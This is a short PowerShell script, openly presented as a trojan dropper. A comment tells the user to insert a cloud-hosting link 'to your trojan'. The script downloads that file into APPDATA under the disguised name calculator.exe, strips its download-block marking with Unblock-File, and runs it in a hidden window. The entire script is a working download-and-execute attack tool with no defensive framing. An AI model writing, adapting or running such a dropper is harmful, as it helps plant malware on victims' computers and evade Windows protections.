# Define the URL of the file to download
$WebFile = " " # Add a OneDrive or Dropbox or any other cloud hosting link to your trojan.
# Define the destination path for the downloaded file
$destination = "$env:APPDATA\calculator.exe"

# Download the file
try {
    Write-Host "Downloading file from $WebFile..."
    (New-Object System.Net.WebClient).DownloadFile($WebFile, $destination)
    Write-Host "File downloaded successfully to $destination."
} catch {
    Write-Host "Failed to download file: $_"
    exit
}

# Check if the file exists and unblock it
if (Test-Path $destination) {
    try {
        Write-Host "Unblocking file $destination..."
        Unblock-File -Path $destination
        Write-Host "File unblocked successfully."
    } catch {
        Write-Host "Failed to unblock file: $_"
        exit
    }
} else {
    Write-Host "File download failed. The file does not exist at $destination."
    exit
}

# Execute the file
try {
    Write-Host "Executing file $destination..."
    Start-Process -FilePath $destination -WindowStyle hidden
    Write-Host "File executed successfully."
} catch {
    Write-Host "Failed to execute file: $_"
}
